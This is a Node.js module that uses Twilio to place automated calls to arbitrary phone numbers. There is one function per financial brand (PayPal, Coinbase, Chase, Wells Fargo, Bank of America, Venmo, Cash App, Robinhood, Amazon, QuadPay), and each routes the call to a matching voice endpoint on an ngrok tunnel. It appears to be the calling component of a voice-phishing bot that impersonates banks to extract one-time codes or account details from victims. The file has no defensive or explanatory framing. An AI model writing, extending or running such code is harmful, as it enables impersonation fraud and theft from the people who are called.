require("dotenv").config()
const accountSid = process.env.TWILIO_ACCOUNT_SID;
const authToken = process.env.TWILIO_AUTH_TOKEN;
const client = require('twilio')(accountSid, authToken);
const EventEmitter = require("events").EventEmitter;
const ev = new EventEmitter();
const url = process.env.NGROK_URL;

module.exports.paypal = async(number) => {
    return new Promise((resolve, reject) => {
        client.calls.create({
            "url": `${url}/voice`,
            "to": number,
            "from": ""
        }).then(call => {
            if(call) {
                resolve(call)
            } else {
                reject()
            }
        })
    })
}

module.exports.coinbase = async(number, message) => {
    return new Promise((resolve, reject) => {
        client.calls.create({
            "statusCallbackEvent" : ['queued', 'in-progress', 'initiated', 'ringing', 'busy', 'answered', 'cancelled', 'failed', 'no-answer', 'completed'],
            "statusCallback": `${url}/status` ,
            "url": `${url}/coinbase`,
            "to": number,
            "from": "+12093723330"
        }).then(call => {
            if(call) {
                resolve(call)
            } else {
                reject()
            }
        })
    })
}




module.exports.chase = async(number, message) => {
    return new Promise((resolve, reject) => {
        client.calls.create({
            "statusCallbackEvent" : ['initiated', 'ringing', 'answered', 'completed'],
            "statusCallback": `${url}/status` ,
            "url": `${url}/chase`,
            "to": number,
            "from": "+12093723330"
        }).then(call => {
            if(call) {
                resolve(call)
            } else {
                reject()
            }
        })
    })
}

module.exports.quadpay = async(number, message) => {
    return new Promise((resolve, reject) => {
        client.calls.create({
            "url": `${url}/quadpay`,
            "to": number,
            "from": "+12093723330"
        }).then(call => {
            if(call) {
                resolve(call)
            } else {
                reject()
            }
        })
    })
}

module.exports.robinhood = async(number, message) => {
    return new Promise((resolve, reject) => {
        client.calls.create({
            "url": `${url}/robinhood`,
            "to": number,
            "from": "+12093723330"
        }).then(call => {
            if(call) {
                resolve(call)
            } else {
                reject()
            }
        })
    })
}

module.exports.amazon = async(number, message) => {
    return new Promise((resolve, reject) => {
        client.calls.create({
            "url": `${url}/amazon`,
            "to": number,
            "from": "+12093723330"
        }).then(call => {
            if(call) {
                resolve(call)
            } else {
                reject()
            }
        })
    })
}

module.exports.wellsfargo = async(number, message) => {
    return new Promise((resolve, reject) => {
        client.calls.create({
            "url": `${url}/wellsfargo`,
            "to": number,
            "from": "+12093723330"
        }).then(call => {
            if(call) {
                resolve(call)
            } else {
                reject()
            }
        })
    })
}

module.exports.boa = async(number, message) => {
    return new Promise((resolve, reject) => {
        client.calls.create({
            "url": `${url}/boa`,
            "to": number,
            "from": "+12093723330"
        }).then(call => {
            if(call) {
                resolve(call)
            } else {
                reject()
            }
        })
    })
}

module.exports.venmo = async(number, message) => {
    return new Promise((resolve, reject) => {
        client.calls.create({
            "url": `${url}/venmo`,
            "to": number,
            "from": "+12093723330"
        }).then(call => {
            if(call) {
                resolve(call)
            } else {
                reject()
            }
        })
    })
}

module.exports.cashapp = async(number, message) => {
    return new Promise((resolve, reject) => {
        client.calls.create({
            "url": `${url}/cashapp`,
            "to": number,
            "from": "+12093723330"
        }).then(call => {
            if(call) {
                resolve(call)
            } else {
                reject()
            }
        })
    })
}

module.exports.ev = ev;